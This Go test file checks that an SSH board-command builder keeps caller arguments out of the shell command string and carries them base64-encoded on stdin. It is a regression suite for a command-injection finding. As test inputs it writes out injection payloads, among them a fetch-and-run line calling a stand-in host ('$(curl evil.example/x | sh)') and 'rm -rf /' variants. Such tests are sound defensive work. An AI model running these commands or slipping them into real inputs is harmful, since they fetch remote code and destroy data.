package session

import (
	"bytes"
	"encoding/base64"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestLocalSession_BoardHostID(t *testing.T) {
	s := &LocalSession{}
	assert.Equal(t, "local", s.BoardHostID())
}

func TestTmuxLocalSession_BoardHostID(t *testing.T) {
	s := &TmuxLocalSession{}
	assert.Equal(t, "local", s.BoardHostID())
}

func TestSSHSession_BoardHostID(t *testing.T) {
	s := &SSHSession{connectionName: "build-host"}
	assert.Equal(t, "build-host", s.BoardHostID())
}

func TestTmuxSSHSession_BoardHostID(t *testing.T) {
	s := &TmuxSSHSession{connectionName: "build-host"}
	assert.Equal(t, "build-host", s.BoardHostID())
}

// Capability assertions: only SSH-backed session types implement
// BoardExecutor/BoardHomeDirer, matching CWDGetter/GitContextGetter's
// existing optional-capability pattern.
func TestBoardCapabilities_ImplementedBySSHTypesOnly(t *testing.T) {
	var _ BoardHostID = (*LocalSession)(nil)
	var _ BoardHostID = (*TmuxLocalSession)(nil)
	var _ BoardHostID = (*SSHSession)(nil)
	var _ BoardHostID = (*TmuxSSHSession)(nil)

	var _ BoardExecutor = (*SSHSession)(nil)
	var _ BoardExecutor = (*TmuxSSHSession)(nil)
	var _ BoardHomeDirer = (*SSHSession)(nil)
	var _ BoardHomeDirer = (*TmuxSSHSession)(nil)

	if _, ok := any((*LocalSession)(nil)).(BoardExecutor); ok {
		t.Fatal("LocalSession must not implement BoardExecutor")
	}
	if _, ok := any((*TmuxLocalSession)(nil)).(BoardExecutor); ok {
		t.Fatal("TmuxLocalSession must not implement BoardExecutor")
	}
}

func TestBuildBoardCommand_ScriptPathValidatedAndQuoted(t *testing.T) {
	cmd, stdin, err := buildBoardCommand([]string{"/opt/agmsg/scripts/api.sh", "get", "teams"})
	require.NoError(t, err)
	assert.Contains(t, cmd, "exec '/opt/agmsg/scripts/api.sh' ")
	// Two arguments after the script path means two "read" lines and two
	// base64 lines on stdin.
	assert.Equal(t, 2, strings.Count(cmd, "IFS= read -r"))
	assert.Equal(t, 2, strings.Count(string(stdin), "\n"))
}

func TestBuildBoardCommand_RejectsRelativeOrMetacharacterScriptPath(t *testing.T) {
	_, _, err := buildBoardCommand([]string{"scripts/api.sh"})
	require.Error(t, err)

	_, _, err = buildBoardCommand([]string{"/opt/agmsg; rm -rf /"})
	require.Error(t, err)
}

func TestBuildBoardCommand_EmptyArgs(t *testing.T) {
	_, _, err := buildBoardCommand(nil)
	require.Error(t, err)
}

// Regression test for the CodeQL go/command-injection finding on PR #163:
// an earlier revision base64-encoded each argument and embedded the
// *encoded* literal inline in the returned command string (regex-checked
// and single-quoted first). CodeQL still flagged it, because on the
// success path the checked value was still concatenated into the string
// handed to the ssh exec sink — a regex check does not remove a value from
// a taint-tracking dataflow graph just because it passed. This version
// carries no argument bytes in the command string at all: every dangerous
// value must be completely absent from cmd, appearing only in the stdin
// payload buildBoardCommand returns alongside it.
func TestBuildBoardCommand_NoArgumentBytesInCommandString(t *testing.T) {
	dangerous := []string{
		`'; rm -rf / #`,
		"`whoami`",
		"$(curl evil.example/x | sh)",
		`"; echo pwned; "`,
		"team with spaces",
		"body\nwith\nembedded\nnewlines",
		"",
	}
	cmd, stdin, err := buildBoardCommand(append([]string{"/opt/agmsg/scripts/send.sh"}, dangerous...))
	require.NoError(t, err)
	for _, v := range dangerous {
		if v != "" && strings.Contains(cmd, v) {
			t.Fatalf("buildBoardCommand leaked raw input into the command string: %q found in %q", v, cmd)
		}
	}
	// The command string must consist only of hardcoded shell boilerplate,
	// the validated script path, and "$aN" variable references — never
	// literal argument content.
	assert.Equal(t, len(dangerous), strings.Count(cmd, "IFS= read -r"))
	assert.NotContains(t, cmd, "rm -rf")

	// The dangerous bytes must round-trip correctly through the base64
	// stdin encoding.
	lines := strings.Split(strings.TrimSuffix(string(stdin), "\n"), "\n")
	require.Len(t, lines, len(dangerous))
	for i, v := range dangerous {
		decoded, err := base64.StdEncoding.DecodeString(lines[i])
		require.NoError(t, err)
		assert.Equal(t, v, string(decoded))
	}
}

// End-to-end regression test: actually execute the generated command
// string through a real POSIX shell with the generated stdin payload, and
// assert argv reaches the target script exactly as the caller intended —
// not merely that the command string looks safe, but that the read/decode
// mechanism is correct for shell metacharacters, quotes, command
// substitution syntax, and embedded newlines.
func TestBuildBoardCommand_EndToEndRoundTripThroughRealShell(t *testing.T) {
	if _, err := exec.LookPath("/bin/sh"); err != nil {
		t.Skip("/bin/sh not available")
	}
	dumpScript := filepath.Join(t.TempDir(), "argv-dump.sh")
	dumpScriptContents := []byte("#!/bin/sh\nfor a in \"$@\"; do printf '%s\\036' \"$a\"; done\n")
	err := os.WriteFile(dumpScript, dumpScriptContents, 0o755) //nolint:gosec // G306: test fixture, needs to be executable
	require.NoError(t, err)

	dangerous := []string{
		"panemux",
		"pane-a",
		"pane-b",
		"please review; `rm -rf /` $(evil) 'quoted' \"double\" \nsecond line",
		"--force",
	}
	cmd, stdin, err := buildBoardCommand(append([]string{dumpScript}, dangerous...))
	require.NoError(t, err)

	execCmd := exec.Command("/bin/sh", "-c", cmd)
	execCmd.Stdin = bytes.NewReader(stdin)
	out, err := execCmd.Output()
	require.NoError(t, err)

	got := strings.Split(strings.TrimSuffix(string(out), "\x1e"), "\x1e")
	require.Equal(t, dangerous, got)
}

func TestBuildBoardCommand_SendShMessageBodyRoundTrips(t *testing.T) {
	body := "please review; `rm -rf /` $(evil) 'quoted'"
	cmd, stdin, err := buildBoardCommand([]string{
		"/opt/agmsg/scripts/send.sh", "panemux", "pane-a", "pane-b", body, "--force",
	})
	require.NoError(t, err)
	if strings.Contains(cmd, "rm -rf") {
		t.Fatalf("expected the message body to never appear verbatim in the command string, got: %s", cmd)
	}
	lines := strings.Split(strings.TrimSuffix(string(stdin), "\n"), "\n")
	require.Len(t, lines, 5)
	last, err := base64.StdEncoding.DecodeString(lines[len(lines)-1])
	require.NoError(t, err)
	assert.Equal(t, "--force", string(last))
}

func TestRemoteBoardHomeDir_ParsesAndTrims(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{
			boardHomeDirCmd: []byte("/home/build-user\n"),
		},
	}
	home, err := remoteBoardHomeDir(runner)
	require.NoError(t, err)
	assert.Equal(t, "/home/build-user", home)
}

func TestRemoteBoardHomeDir_EmptyOutputIsError(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{
			boardHomeDirCmd: []byte(""),
		},
	}
	_, err := remoteBoardHomeDir(runner)
	require.Error(t, err)
}

func TestRemoteBoardHomeDir_CommandError(t *testing.T) {
	runner := &fakeSSHRunner{
		outputs: map[string][]byte{},
		errs:    map[string]error{boardHomeDirCmd: errors.New("probe failed")},
	}
	_, err := remoteBoardHomeDir(runner)
	require.Error(t, err)
}
